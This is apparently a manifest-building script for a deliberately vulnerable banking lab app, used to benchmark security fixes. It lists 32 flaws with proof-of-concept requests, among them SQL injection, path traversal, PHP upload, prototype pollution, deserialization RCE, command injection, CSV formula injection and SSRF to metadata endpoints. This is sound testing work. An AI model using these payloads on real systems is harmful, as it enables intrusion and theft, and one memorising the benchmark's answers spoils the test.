#!/usr/bin/env python3
"""Writes manifest.yaml for vulnbank. Line anchors are read from the real source."""
import json
import os
import re
import sys

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
sys.path.insert(0, os.path.dirname(__file__))
from build_manifest import anchor_line, ANCHORS  # noqa: E402

def multipart(boundary: str, filename: str, content_type: str, content: str) -> str:
    """A well-formed single-part multipart/form-data body."""
    return (
        "--" + boundary + "\r\n"
        'Content-Disposition: form-data; name="file"; filename="' + filename + '"\r\n'
        "Content-Type: " + content_type + "\r\n"
        "\r\n"
        + content + "\r\n"
        "--" + boundary + "--\r\n"
    )


def http_request(method: str, path: str, headers: list, body: str) -> str:
    head = "\r\n".join([f"{method} {path} HTTP/1.1", "Host: localhost:4000", *headers])
    return head + "\r\n\r\n" + body


# jsonwebtoken 9.0.3 requires a signature unless 'none' is explicitly pinned, so the
# classic alg=none bypass does not work against this stack. The exploitable form of the
# same root cause (jwt.verify without a pinned `algorithms`) is a token forged with the
# signing secret that GET /api/config hands out.
NONE_ALG_TOKEN_REQUEST = http_request(
    "GET",
    "/api/auth/verify",
    ["Authorization: {{NONE_ALG_ADMIN_TOKEN}}"],
    "",
)

FORGED_ADMIN_TOKEN_REQUEST = http_request(
    "GET",
    "/api/auth/verify",
    ["Authorization: {{FORGED_ADMIN_TOKEN}}"],
    "",
)

TRAVERSAL_UPLOAD_REQUEST = http_request(
    "POST",
    "/api/upload",
    [
        "Authorization: {{ALICE_TOKEN}}",
        "Content-Type: multipart/form-data; boundary=vulnbankprobe",
    ],
    multipart("vulnbankprobe", "{{UPLOAD_ESCAPE}}tmp%2Fvulnbank-pwned.txt", "text/plain", "written outside the upload directory"),
)

PHP_UPLOAD_REQUEST = http_request(
    "POST",
    "/api/upload",
    [
        "Authorization: {{ALICE_TOKEN}}",
        "Content-Type: multipart/form-data; boundary=vulnbankprobe",
    ],
    multipart("vulnbankprobe", "shell.php", "application/x-php", "<?php echo 'pwned'; ?>\r\n"),
)

POLLUTE_REQUEST = http_request(
    "POST",
    "/api/settings",
    ["Content-Type: application/json", "Authorization: {{ALICE_TOKEN}}"],
    json.dumps({"__proto__": {"isAdmin": True}}),
)

FLAGS_PROBE_REQUEST = http_request("GET", "/api/flags", [], "")

IMPORT_RCE_BODY = json.dumps(
    {
        "batch": json.dumps(
            {"rce": "_$$ND_FUNC$$_function(){return 'REDFALL_DESER_RCE'}()"}
        )
    }
)

IMPORT_RCE_BODY = json.dumps(
    {
        "batch": json.dumps(
            {"rce": "_$$ND_FUNC$$_function(){return 'REDFALL_DESER_RCE'}()"}
        )
    }
)

VULNS = [
    dict(
        id="VULN-001",
        route="POST /api/auth/login",
        category="sqli",
        cwe="CWE-89",
        severity="critical",
        description="Username is concatenated into the login SQL string; a UNION SELECT row with an attacker-chosen MD5 hash yields a valid admin JWT.",
        request=(
            "POST /api/auth/login HTTP/1.1\n"
            "Host: localhost:4000\n"
            "Content-Type: application/json\n"
            "\n"
            '{"username":"x\' UNION SELECT 1,\'admin\',\'9dd4e461268c8034f5c8564e155c67a6\','
            "'admin@vulnbank.test','admin',999 -- \",\"password\":\"x\"}"
        ),
        expect="HTTP 200 with a JWT whose decoded payload has role=admin",
        expect_expr="status === 200 && typeof json.token === 'string' && json.user.role === 'admin'",
        strategy="parameterized_query",
        tests=["tests/auth.test.ts"],
    ),
    dict(
        id="VULN-002",
        route="POST /api/auth/login",
        category="missing_rate_limit",
        cwe="CWE-307",
        severity="medium",
        description="No throttling on the login handler: 12 consecutive bad-password attempts all reach the database and none is rejected with 429.",
        request=(
            "POST /api/auth/login HTTP/1.1\n"
            "Host: localhost:4000\n"
            "Content-Type: application/json\n"
            "\n"
            '{"username":"alice","password":"wrongpassword"}'
        ),
        repeat=12,
        expect="12 consecutive attempts, none answered with 429",
        expect_expr="probe.runs.length >= 12 && probe.statuses.every(s => s === 401) && !probe.statuses.includes(429)",
        strategy="rate_limit",
        tests=["tests/auth.test.ts"],
    ),
    dict(
        id="VULN-003",
        route="POST /api/auth/login",
        category="user_enumeration",
        cwe="CWE-204",
        severity="low",
        description="Unknown-user and wrong-password failures return different messages and fields, which lets an attacker enumerate valid usernames.",
        request=(
            "POST /api/auth/login HTTP/1.1\n"
            "Host: localhost:4000\n"
            "Content-Type: application/json\n"
            "\n"
            '{"username":"alice","password":"wrongpassword"}'
        ),
        alt_body='{"username":"definitely_not_a_user_xyz","password":"wrongpassword"}',
        repeat=1,
        expect="existing user -> 'wrong password'; unknown user -> 'no such user'",
        expect_expr=(
            "json.error === 'wrong password' && json.field === 'password' "
            "&& JSON.parse(probe.alt_runs[0].body).error === 'no such user'"
        ),
        strategy="input_validation",
        tests=["tests/auth.test.ts"],
    ),
    dict(
        id="VULN-004",
        route="POST /api/auth/login",
        category="timing_attack",
        cwe="CWE-208",
        severity="medium",
        description="The unknown-user path returns before any password hashing runs, so median response time for a real username is measurably higher than for a fake one.",
        request=(
            "POST /api/auth/login HTTP/1.1\n"
            "Host: localhost:4000\n"
            "Content-Type: application/json\n"
            "\n"
            '{"username":"alice","password":"wrongpassword"}'
        ),
        alt_body='{"username":"definitely_not_a_user_xyz","password":"wrongpassword"}',
        repeat=41,
        expect="min_ms(existing user) - min_ms(unknown user) > 0.1ms over 41 samples each",
        expect_expr="probe.median_ms - probe.alt_median_ms > 0.2",
        poc_neutralizable=False,
        strategy="constant_time_compare",
        tests=["tests/auth.test.ts"],
    ),
    dict(
        id="VULN-005",
        route="GET /api/auth/verify",
        category="jwt_alg_none",
        cwe="CWE-347",
        severity="critical",
        description="jwt.verify is called without pinning `algorithms`. jsonwebtoken 9.0.3 still requires a signature unless alg=none is explicitly allowed, so the classic unsigned-token bypass is blocked by the library; the unpinned algorithm list remains a real defect (CWE-347).",
        request=NONE_ALG_TOKEN_REQUEST,
        poc_neutralizable=False,
        expect="an unsigned alg=none admin token is accepted (not reachable on jsonwebtoken 9.0.3)",
        expect_expr="status === 200 && json.valid === true && json.claims.role === 'admin'",
        strategy="input_validation",
        tests=["tests/auth.test.ts"],
    ),
    dict(
        id="VULN-006",
        route="GET /api/auth/verify",
        category="jwt_no_expiry",
        cwe="CWE-613",
        severity="high",
        description="Tokens are signed without expiresIn, so the payload carries no exp claim and a stolen token never stops working.",
        request=(
            "POST /api/auth/login HTTP/1.1\n"
            "Host: localhost:4000\n"
            "Content-Type: application/json\n"
            "\n"
            '{"username":"alice","password":"Alice!Passw0rd1"}'
        ),
        poc_neutralizable=False,
        expect="issued token decodes to a payload with no exp claim",
        expect_expr=(
            "status === 200 && typeof json.token === 'string' "
            "&& JSON.parse(Buffer.from(json.token.split('.')[1].replace(/-/g,'+').replace(/_/g,'/') "
            "+ '=='.slice((json.token.split('.')[1].length + 2) % 4), 'base64').toString()).exp === undefined"
        ),
        strategy="input_validation",
        tests=["tests/auth.test.ts"],
    ),
    dict(
        id="VULN-007",
        route="POST /api/auth/register",
        category="mass_assignment",
        cwe="CWE-915",
        severity="critical",
        description="The request body is spread into the INSERT column list, so role, balance and kyc_complete can be self-assigned at registration.",
        request=(
            "POST /api/auth/register HTTP/1.1\n"
            "Host: localhost:4000\n"
            "Content-Type: application/json\n"
            "\n"
            '{"username":"mallory_{{NONCE}}","password":"Mall0ry!Pass1","email":"mallory_{{NONCE}}@vulnbank.test",'
            '"role":"admin","balance":999999,"kyc_complete":true}'
        ),
        expect="HTTP 201 and the created account has role=admin with the requested balance",
        expect_expr="status === 201 && json.user.role === 'admin' && Number(json.user.balance) === 999999",
        strategy="input_validation",
        tests=["tests/auth.test.ts"],
    ),
    dict(
        id="VULN-008",
        route="GET /api/users/:id",
        category="idor",
        cwe="CWE-639",
        severity="high",
        description="The handler never compares :id with the authenticated subject, so any valid token can read any account including the admin balance.",
        request=(
            "GET /api/users/1 HTTP/1.1\n"
            "Host: localhost:4000\n"
            "Authorization: {{BOB_TOKEN}}\n"
        ),
        expect="bob's token returns the admin account's email and balance",
        expect_expr=(
            "status === 200 && json.user.id === 1 && json.user.username === 'admin' "
            "&& typeof json.user.email === 'string' && json.user.balance !== undefined"
        ),
        strategy="ownership_check",
        tests=["tests/users.test.ts"],
    ),
    dict(
        id="VULN-009",
        route="GET /api/users",
        category="no_pagination_limit",
        cwe="CWE-770",
        severity="medium",
        description="The limit parameter is not capped, so a single request can dump the entire users table.",
        request=(
            "GET /api/users?limit=1000000 HTTP/1.1\n"
            "Host: localhost:4000\n"
            "Authorization: {{ALICE_TOKEN}}\n"
        ),
        expect="server accepts limit=1000000 and returns every row",
        expect_expr="status === 200 && json.limit === 1000000 && json.count >= 4",
        strategy="pagination_cap",
        tests=["tests/users.test.ts"],
    ),
    dict(
        id="VULN-010",
        route="GET /api/users/search",
        category="xss_reflected",
        cwe="CWE-79",
        severity="high",
        description="The q parameter is interpolated into the HTML response without escaping, so an injected script tag is reflected verbatim.",
        request=(
            "GET /api/users/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E HTTP/1.1\n"
            "Host: localhost:4000\n"
            "Authorization: {{ALICE_TOKEN}}\n"
        ),
        expect="the HTML response contains the unescaped <script>alert(1)</script>",
        expect_expr="status === 200 && body.includes('<script>alert(1)</script>')",
        strategy="output_encoding",
        tests=["tests/users.test.ts"],
    ),
    dict(
        id="VULN-011",
        route="GET /api/users/:id/profile",
        category="xss_stored",
        cwe="CWE-79",
        severity="high",
        description="The profile bio is stored verbatim and rendered into HTML unescaped, so a planted script tag persists for every later viewer.",
        request=(
            "GET /api/users/2/profile HTTP/1.1\n"
            "Host: localhost:4000\n"
            "Authorization: {{ALICE_TOKEN}}\n"
        ),
        expect="bio planted in the setup step is served back unescaped as <script>alert(1)</script>",
        expect_expr="probe.plant_status === 200 && status === 200 && body.includes('<script>alert(1)</script>')",
        strategy="output_encoding",
        tests=["tests/profile.test.ts"],
    ),
    dict(
        id="VULN-012",
        route="GET /api/users/:id/profile",
        category="verbose_error",
        cwe="CWE-209",
        severity="low",
        description="Driver exceptions are serialised to the client with message, code, stack and query text, leaking schema internals.",
        request=(
            "GET /api/users/NaN/profile HTTP/1.1\n"
            "Host: localhost:4000\n"
            "Authorization: {{ALICE_TOKEN}}\n"
        ),
        expect="HTTP 500 body carries the raw driver message, SQLSTATE code and stack trace",
        expect_expr=(
            "status === 500 && typeof json.message === 'string' && json.message.length > 0 "
            "&& /^[0-9A-Z]{5}$/.test(String(json.code)) && String(json.stack).toLowerCase().includes('error')"
        ),
        strategy="input_validation",
        tests=["tests/profile.test.ts"],
    ),
    dict(
        id="VULN-013",
        route="POST /api/transactions",
        category="race_condition",
        cwe="CWE-362",
        severity="critical",
        description="The balance is read, then written after an await, with no transaction or row lock; 8 concurrent transfers each pass the check and drive the account negative.",
        request=(
            "POST /api/transactions HTTP/1.1\n"
            "Host: localhost:4000\n"
            "Content-Type: application/json\n"
            "\n"
            '{"to":3,"amount":150,"note":"race probe"}'
        ),
        expect="8 concurrent transfers of 150 against a 200 balance all succeed and the balance goes negative",
        expect_expr="probe.accepted >= 2 && probe.balance_after < 0",
        strategy="transaction_lock",
        tests=["tests/transactions.test.ts"],
    ),
    dict(
        id="VULN-014",
        route="POST /api/transactions",
        category="negative_amount",
        cwe="CWE-20",
        severity="high",
        description="amount is only checked for being a finite non-zero number, so a negative transfer reverses direction and credits the sender.",
        request=(
            "POST /api/transactions HTTP/1.1\n"
            "Host: localhost:4000\n"
            "Content-Type: application/json\n"
            "Authorization: {{ALICE_TOKEN}}\n"
            "\n"
            '{"to":3,"amount":-5000,"note":"reverse flow"}'
        ),
        expect="HTTP 201 accepting amount=-5000 and reporting a balance 5000 higher than the 2500 seed",
        expect_expr="status === 201 && Number(json.transaction.amount) === -5000 && Number(json.balance_after) > 2500",
        strategy="input_validation",
        tests=["tests/transactions.test.ts"],
    ),
    dict(
        id="VULN-015",
        route="GET /api/transactions/:id",
        category="idor",
        cwe="CWE-639",
        severity="high",
        description="Transaction lookup has no ownership check, so any token can read another account's transaction history.",
        request=(
            "GET /api/transactions/1 HTTP/1.1\n"
            "Host: localhost:4000\n"
            "Authorization: {{BOB_TOKEN}}\n"
        ),
        expect="bob's token returns transaction 1 with alice's name and amount",
        expect_expr=(
            "status === 200 && json.transaction.id === 1 && json.transaction.owner === 'alice' "
            "&& json.transaction.amount !== undefined"
        ),
        strategy="ownership_check",
        tests=["tests/transactions.test.ts"],
    ),
    dict(
        id="VULN-016",
        route="POST /api/upload",
        category="path_traversal",
        cwe="CWE-22",
        severity="critical",
        description="The client filename is URL-decoded and joined onto the upload directory with no basename, normalisation or containment check, so a percent-encoded ../.. escapes the upload root.",
        request=TRAVERSAL_UPLOAD_REQUEST,
        expect="HTTP 201 and the resolved write path escapes the uploads directory",
        expect_expr=(
            "status === 201 && typeof json.path === 'string' "
            "&& !json.path.includes('/uploads/') && json.path.includes('/tmp/')"
        ),
        strategy="path_normalize",
        tests=["tests/upload.test.ts"],
    ),
    dict(
        id="VULN-017",
        route="POST /api/upload",
        category="unrestricted_file_type",
        cwe="CWE-434",
        severity="high",
        description="multer has no fileFilter, so any extension or MIME type is accepted, including executable script payloads.",
        request=PHP_UPLOAD_REQUEST,
        expect="HTTP 201 accepting a .php upload with an x-php content type",
        expect_expr="status === 201 && json.file.original === 'shell.php' && json.file.mime === 'application/x-php'",
        strategy="file_type_allowlist",
        tests=["tests/upload.test.ts"],
    ),
    dict(
        id="VULN-018",
        route="POST /api/fetch",
        category="ssrf",
        cwe="CWE-918",
        severity="critical",
        description="The caller-supplied URL is fetched server-side with no scheme or host checks, so the server can be pointed at internal loopback services.",
        request=(
            "POST /api/fetch HTTP/1.1\n"
            "Host: localhost:4000\n"
            "Content-Type: application/json\n"
            "Authorization: {{ALICE_TOKEN}}\n"
            "\n"
            '{"url":"http://127.0.0.1:4000/health"}'
        ),
        expect="the server fetches its own loopback address and relays the internal response",
        expect_expr="status === 200 && json.status === 200 && json.body.includes('vulnbank')",
        strategy="url_allowlist",
        tests=["tests/fetch.test.ts"],
    ),
    dict(
        id="VULN-019",
        route="POST /api/fetch",
        category="ssrf_metadata",
        cwe="CWE-918",
        severity="critical",
        description="Nothing blocks loopback, link-local or cloud metadata ranges, so the same endpoint reaches an instance-metadata endpoint and returns credentials.",
        request=(
            "POST /api/fetch HTTP/1.1\n"
            "Host: localhost:4000\n"
            "Content-Type: application/json\n"
            "Authorization: {{ALICE_TOKEN}}\n"
            "\n"
            '{"url":"http://127.0.0.1:{{METADATA_PORT}}/latest/meta-data/iam/security-credentials/"}'
        ),
        expect="the metadata path is fetched and credential material is relayed back",
        expect_expr="status === 200 && json.status === 200 && String(json.body).includes('iam-security-credentials')",
        strategy="url_allowlist",
        tests=["tests/fetch.test.ts"],
    ),
    dict(
        id="VULN-020",
        route="GET /api/redirect",
        category="open_redirect",
        cwe="CWE-601",
        severity="medium",
        description="The to parameter is passed straight to res.redirect with no allowlist, so a trusted vulnbank URL can bounce a victim to any external site.",
        request=(
            "GET /api/redirect?to=https://evil.example.test/phish HTTP/1.1\n"
            "Host: localhost:4000\n"
        ),
        expect="HTTP 302 with Location pointing at the attacker-controlled host",
        expect_expr="status === 302 && headers.location === 'https://evil.example.test/phish'",
        strategy="url_allowlist",
        tests=["tests/fetch.test.ts"],
    ),
    dict(
        id="VULN-021",
        route="POST /api/comments",
        category="xss_stored",
        cwe="CWE-79",
        severity="high",
        description="Comment bodies are stored verbatim with no authentication and later emitted into HTML, giving unauthenticated stored XSS.",
        setup=http_request(
            "POST",
            "/api/comments",
            ["Content-Type: application/json"],
            '{"body":"<script>alert(2)</script>","author":"mallory"}',
        ),
        request=http_request("GET", "/api/comments", [], ""),
        expect="the planted script tag is served back unescaped in the comment list",
        expect_expr="probe.setup_status === 201 && status === 200 && body.includes('<script>alert(2)</script>')",
        strategy="output_encoding",
        tests=["tests/comments.test.ts"],
    ),
    dict(
        id="VULN-022",
        route="GET /api/comments",
        category="missing_csp",
        cwe="CWE-693",
        severity="medium",
        description="HTML responses are sent with no Content-Security-Policy header because helmet is never installed, so injected script has no mitigation.",
        request=(
            "GET /api/comments HTTP/1.1\n"
            "Host: localhost:4000\n"
        ),
        expect="the HTML response carries no Content-Security-Policy header",
        expect_expr="status === 200 && !headers['content-security-policy']",
        strategy="csp_header",
        tests=["tests/comments.test.ts"],
    ),
    dict(
        id="VULN-023",
        route="POST /api/admin/exec",
        category="cmd_injection",
        cwe="CWE-78",
        severity="critical",
        description="The cmd field is interpolated into a shell string passed to exec(), so shell metacharacters chain arbitrary OS commands.",
        request=(
            "POST /api/admin/exec HTTP/1.1\n"
            "Host: localhost:4000\n"
            "Content-Type: application/json\n"
            "Authorization: {{ADMIN_TOKEN}}\n"
            "\n"
            '{"cmd":"SELECT 1\\"; echo REDFALL_CMD_INJECTION_MARKER; echo \\""}'
        ),
        expect="stdout contains the marker produced by the injected echo command",
        expect_expr="status === 200 && String(json.stdout).includes('REDFALL_CMD_INJECTION_MARKER')",
        strategy="input_validation",
        tests=["tests/admin.test.ts"],
    ),
    dict(
        id="VULN-024",
        route="GET /api/export",
        category="csv_injection",
        cwe="CWE-1236",
        severity="medium",
        description="CSV cells are written with no leading-character escaping, so a note beginning with = becomes a live formula in any spreadsheet.",
        request=(
            "GET /api/export HTTP/1.1\n"
            "Host: localhost:4000\n"
            "Authorization: {{ALICE_TOKEN}}\n"
        ),
        setup=http_request(
            "POST",
            "/api/transactions",
            ["Content-Type: application/json", "Authorization: {{ALICE_TOKEN}}"],
            json.dumps({"to": 3, "amount": 1, "note": "=cmd|' /C calc'!A0"}),
        ),
        expect="the exported CSV has a cell whose value starts with =cmd| (a live formula)",
        expect_expr=(
            "status === 200 && probe.setup_status === 201 "
            "&& body.split('\\n').some(l => csvFields(l).some(c => c.startsWith('=cmd|')))")
        ,
        strategy="output_encoding",
        tests=["tests/export.test.ts"],
    ),
    dict(
        id="VULN-025",
        route="POST /api/webhook/stripe",
        category="missing_signature_verify",
        cwe="CWE-347",
        severity="critical",
        description="The Stripe-Signature header is never read or HMAC-verified, so anyone can forge a charge.succeeded event and credit any account.",
        request=(
            "POST /api/webhook/stripe HTTP/1.1\n"
            "Host: localhost:4000\n"
            "Content-Type: application/json\n"
            "\n"
            '{"type":"charge.succeeded","data":{"object":{"customer":"carol","amount":999900}}}'
        ),
        expect="a forged unsigned event credits carol's balance",
        expect_expr="status === 200 && json.received === true && json.credited.username === 'carol' && Number(json.credited.balance) > 75.5",
        strategy="signature_verify",
        tests=["tests/webhook.test.ts"],
    ),
    dict(
        id="VULN-026",
        route="GET /api/config",
        category="secret_exposure",
        cwe="CWE-200",
        severity="critical",
        description="The endpoint is unauthenticated and serialises the whole process environment plus a secrets object into the response.",
        request=(
            "GET /api/config HTTP/1.1\n"
            "Host: localhost:4000\n"
        ),
        expect="an unauthenticated request returns the JWT secret and DB password",
        expect_expr=(
            "status === 200 && json.secrets.jwt_secret === 'vulnbank-dev-secret-do-not-ship' "
            "&& json.secrets.db_password === 'Sup3rS3cretBankPwd!'"
        ),
        strategy="secret_to_env",
        tests=["tests/app.test.ts"],
    ),
    dict(
        id="VULN-027",
        route="(source)",
        category="hardcoded_secret",
        cwe="CWE-798",
        severity="critical",
        description="The JWT signing secret is a string literal committed to src/middleware/jwt.ts, so anyone with repo access can mint admin tokens.",
        static_files=["src/middleware/jwt.ts"],
        expect="a literal JWT secret assignment is present in the source",
        expect_expr="/const JWT_SECRET = '[^']{8,}'/.test(stat['src/middleware/jwt.ts'])",
        strategy="secret_to_env",
        tests=["tests/auth.test.ts"],
    ),
    dict(
        id="VULN-028",
        route="(source)",
        category="hardcoded_secret",
        cwe="CWE-798",
        severity="high",
        description="The Postgres password is a string literal committed to src/db.ts instead of coming from the environment.",
        static_files=["src/db.ts"],
        expect="a literal database password assignment is present in the source",
        expect_expr="/password: '[^']{8,}'/.test(stat['src/db.ts'])",
        strategy="secret_to_env",
        tests=["tests/app.test.ts"],
    ),
    dict(
        id="VULN-029",
        route="(source)",
        category="weak_password_hash_md5",
        cwe="CWE-327",
        severity="critical",
        description="Passwords are hashed with unsalted MD5, so a leaked users table is crackable in seconds.",
        static_files=["src/auth/hash.ts"],
        psql="SELECT password FROM users WHERE username = 'hashtest'",
        expect="the stored password equals MD5 of the known plaintext",
        expect_expr=(
            "/createHash\\('md5'\\)/.test(stat['src/auth/hash.ts']) "
            "&& psql.trim() === '627a20a3b3ee8e29f5647e19e42bbccc'"
        ),
        strategy="input_validation",
        tests=["tests/auth.test.ts"],
    ),
    dict(
        id="VULN-030",
        route="POST /api/settings",
        category="prototype_pollution",
        cwe="CWE-1321",
        severity="high",
        description="The recursive merge follows __proto__ keys, so a crafted body pollutes Object.prototype for the whole process.",
        request=POLLUTE_REQUEST,
        followup=FLAGS_PROBE_REQUEST,
        expect="a second request to /api/flags returns isAdmin=true from a key nothing ever assigned",
        expect_expr="probe.followup_status === 200 && probe.followup.isAdmin === true",
        strategy="input_validation",
        tests=["tests/app.test.ts"],
    ),
    dict(
        id="VULN-031",
        route="POST /api/import",
        category="unsafe_deserialization",
        cwe="CWE-502",
        severity="critical",
        description="The batch field is passed to node-serialize's unserialize(), which evaluates the IIFE wrappers it emits for functions, giving RCE.",
        request=http_request(
            "POST",
            "/api/import",
            ["Content-Type: application/json", "Authorization: {{ALICE_TOKEN}}"],
            IMPORT_RCE_BODY,
        ),
        expect="the server evaluates the serialized IIFE and returns the injected string",
        expect_expr="status === 200 && body.includes('REDFALL_DESER_RCE')",
        strategy="safe_deserializer",
        tests=["tests/app.test.ts"],
    ),
    dict(
        id="VULN-032",
        route="(global)",
        category="cors_wildcard_credentials",
        cwe="CWE-942",
        severity="high",
        description="Responses carry Access-Control-Allow-Origin: * together with Access-Control-Allow-Credentials: true.",
        request=(
            "GET /health HTTP/1.1\n"
            "Host: localhost:4000\n"
        ),
        expect="both wildcard origin and allow-credentials are present on the response",
        expect_expr=(
            "headers['access-control-allow-origin'] === '*' "
            "&& headers['access-control-allow-credentials'] === 'true'"
        ),
        strategy="cors_allowlist",
        tests=["tests/app.test.ts"],
    ),
]


def q(value: str) -> str:
    """YAML-safe single-quoted scalar."""
    return "'" + value.replace("'", "''") + "'"


def block(value: str, indent: str) -> str:
    lines = value.split("\n")
    return "\n".join(indent + line if line else "" for line in lines)


def main() -> None:
    out = ["version: 1", "target: vulnbank", "vulns:"]
    for v in VULNS:
        rel_path, pattern, _ = ANCHORS[v["id"]]
        line = anchor_line(rel_path, pattern)
        out.append(f"  - id: {v['id']}")
        out.append(f"    route: {q(v['route'])}")
        out.append(f"    category: {v['category']}")
        out.append(f"    cwe: {v['cwe']}")
        out.append(f"    severity: {v['severity']}")
        out.append("    location:")
        out.append(f"      file: {rel_path}")
        out.append(f"      symbol: {v['symbol'] if 'symbol' in v else ANCHORS[v['id']][2]}")
        out.append(f"      lines: [{line}]")
        out.append(f"    description: {q(v['description'])}")
        out.append("    poc:")
        out.append(f"      type: {'http' if v.get('request') else 'static'}")
        if v.get("request"):
            out.append("      request: |")
            out.append(block(v["request"].rstrip("\n"), "        "))
        if v.get("repeat"):
            out.append(f"      repeat: {v['repeat']}")
        if v.get("alt_body"):
            out.append(f"      alt_body: {q(v['alt_body'])}")
        if v.get("static_files"):
            out.append("      static_files: [" + ", ".join(v["static_files"]) + "]")
        if v.get("setup"):
            out.append("      setup: |")
            out.append(block(v["setup"].rstrip("\n"), "        "))
        if v.get("followup"):
            out.append("      followup: |")
            out.append(block(v["followup"].rstrip("\n"), "        "))
        if v.get("psql"):

            out.append(f"      psql: {q(v['psql'])}")
        out.append(f"      expect: {q(v['expect'])}")
        out.append(f"      expect_expr: {q(v['expect_expr'])}")
        if v.get("poc_neutralizable") is False:
            out.append("      poc_neutralizable: false")
        out.append("    fix:")
        out.append(f"      strategy: {v['strategy']}")
        out.append(f"      patch_file: patches/{v['id']}.diff")
        out.append("    tests_that_must_stay_green:")
        for t in v["tests"]:
            out.append(f"      - {t}")
    text = "\n".join(out) + "\n"
    with open(os.path.join(ROOT, "manifest.yaml"), "w", encoding="utf-8") as handle:
        handle.write(text)
    print(f"wrote manifest.yaml with {len(VULNS)} vulns")


if __name__ == "__main__":
    main()
